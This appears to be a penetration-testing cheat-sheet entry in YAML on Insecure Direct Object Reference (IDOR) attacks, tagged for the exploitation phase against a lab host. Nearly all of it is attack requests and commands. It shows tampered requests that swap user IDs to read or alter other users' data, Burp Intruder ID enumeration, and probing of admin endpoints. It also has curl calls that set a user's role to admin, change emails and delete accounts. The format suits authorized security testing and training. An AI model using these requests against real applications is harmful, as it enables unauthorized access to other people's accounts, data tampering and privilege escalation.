---
description: |
  Insecure Direct Object Reference (IDOR) — access unauthorized resources by manipulating object identifiers in URLs, POST bodies, and file references.
command: |
  # Change user ID in URL — horizontal privilege escalation
  # Original request
  GET http://10.10.10.27/api/users/1 HTTP/1.1

  # Tampered request — access another user's data
  GET http://10.10.10.27/api/users/2 HTTP/1.1

  # Change ID in POST body
  # Original POST request
  POST http://10.10.10.27/api/profile HTTP/1.1
  Content-Type: application/json

  {"user_id": 1, "email": "user@senshu.sh"}

  # Tampered — modify another user's profile
  {"user_id": 2, "email": "attacker@senshu.sh"}

  # Change UUID — some apps use UUIDs instead of sequential IDs
  GET http://10.10.10.27/api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890
  # Try UUIDs leaked in other responses, error messages, or public endpoints

  # IDOR in file download endpoints
  http://10.10.10.27/download?file=report_1.pdf
  http://10.10.10.27/download?file=report_2.pdf
  http://10.10.10.27/download?file=report_3.pdf

  # Horizontal privilege escalation — access other users' resources
  GET /api/orders?user_id=1   → GET /api/orders?user_id=2
  GET /api/messages/inbox/1   → GET /api/messages/inbox/2
  GET /api/account/1/settings → GET /api/account/2/settings

  # Vertical privilege escalation — access admin endpoints
  GET /api/admin/users
  GET /api/admin/settings
  GET /api/admin/logs
  POST /api/admin/user/delete

  # Burp Intruder — enumerate IDs
  # Use Burp Intruder with payload type: Numbers
  # Range: 1-1000, Step: 1
  # Target parameter: user_id or object ID in URL/body
  # Compare response sizes to identify valid objects

  # Autorize Burp extension — automated IDOR testing
  # Install Autorize from BApp Store
  # Configure low-privilege session cookie
  # Browse as high-privilege user
  # Autorize replays requests with low-priv cookie and flags unauthorized access

  # Test with different HTTP methods
  curl -X GET http://10.10.10.27/api/users/2
  curl -X POST http://10.10.10.27/api/users/2
  curl -X PUT http://10.10.10.27/api/users/2 -d '{"role":"admin"}'
  curl -X DELETE http://10.10.10.27/api/users/2
  curl -X PATCH http://10.10.10.27/api/users/2 -d '{"email":"pwned@senshu.sh"}'

  # IDOR in file references
  http://10.10.10.27/download?file=report_1.pdf → report_2.pdf
  http://10.10.10.27/api/attachments/invoice_001.pdf → invoice_002.pdf
  http://10.10.10.27/export?id=100 → id=101
items:
  - No_Creds
  - Credentials
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - IDOR
references:
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
  - https://book.hacktricks.wiki/en/pentesting-web/idor.html
---
